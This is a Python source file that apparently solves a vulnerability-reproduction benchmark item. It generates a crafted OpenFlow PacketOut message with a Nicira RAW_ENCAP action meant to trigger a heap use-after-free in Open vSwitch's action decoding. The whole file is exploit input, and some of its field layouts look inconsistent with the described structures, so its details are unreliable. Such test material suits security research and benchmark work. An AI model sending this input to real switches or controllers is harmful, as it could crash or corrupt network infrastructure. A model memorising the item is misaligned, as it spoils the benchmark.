import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input that triggers a Heap Use After Free
        vulnerability in the decoding of RAW_ENCAP actions in ofp-actions.c.

        The PoC is an OpenFlow PacketOut message containing a crafted Nicira
        vendor-specific action (NXAST_RAW_ENCAP). This action includes an
        Ethertype-dependent property. The sizes are chosen such that decoding
        this property forces a reallocation of the buffer holding the decoded
        actions. The vulnerable code continues to use a stale pointer to the
        original buffer, leading to a use-after-free.

        The PoC is structured as follows:
        - OpenFlow Header (OFPT_PACKET_OUT): 8 bytes
        - PacketOut Message Header: 16 bytes
        - Actions (48 bytes total):
          - NXAST_RAW_ENCAP Action Header: 24 bytes
          - Experimenter Property: 24 bytes
        Total length: 72 bytes, matching the ground-truth length.
        """
        
        # 1. OpenFlow Header (8 bytes)
        # version=4 (OpenFlow 1.3), type=OFPT_PACKET_OUT(13), length=72, xid=0
        ofp_header = struct.pack('!BBHI', 4, 13, 72, 0)

        # 2. PacketOut Message Header (16 bytes)
        # buffer_id=OFP_NO_BUFFER, in_port=OFPP_CONTROLLER, actions_len=48
        buffer_id = 0xffffffff
        in_port = 0xfffffffd
        actions_len = 48  # 24 (encap) + 24 (prop)
        pad = b'\x00' * 6
        ofp_packet_out = struct.pack('!IIH', buffer_id, in_port, actions_len) + pad

        # 3. Actions Payload (48 bytes total)
        
        # 3a. NXAST_RAW_ENCAP Action Header (24 bytes)
        OFPAT_VENDOR = 0xffff
        NX_VENDOR_ID = 0x00002320
        NXAST_RAW_ENCAP = 45
        action_len = 48  # Total length of this action including properties
        
        nx_action_encap_header = struct.pack(
            '!HH I HH I HH B 3s',
            OFPAT_VENDOR,       # type: u16
            action_len,         # len: u16
            NX_VENDOR_ID,       # vendor: u32
            NXAST_RAW_ENCAP,    # subtype: u16
            0,                  # flags: u16
            1,                  # in_port: u32
            0x0800,             # packet_type: u16 (IP)
            0x0806,             # new_eth_type: u16 (ARP)
            64,                 # hop_limit: u8
            b'\x00\x00\x00'     # zeros: 3 bytes
        )
        
        # 3b. Experimenter Property (24 bytes)
        # This property's size is chosen to trigger the buffer reallocation.
        OFPPPT_EXPERIMENTER = 0xffff
        prop_len = 24  # 12 bytes header + 12 bytes data
        exp_type = 1
        prop_data = b'\x41' * 12
        
        property_payload = struct.pack(
            '!HHII',
            OFPPPT_EXPERIMENTER, # type: u16
            prop_len,            # len: u16
            NX_VENDOR_ID,        # experimenter: u32
            exp_type             # exp_type: u32
        ) + prop_data

        actions = nx_action_encap_header + property_payload
        
        # Assemble the final PoC
        poc = ofp_header + ofp_packet_out + actions

        return poc
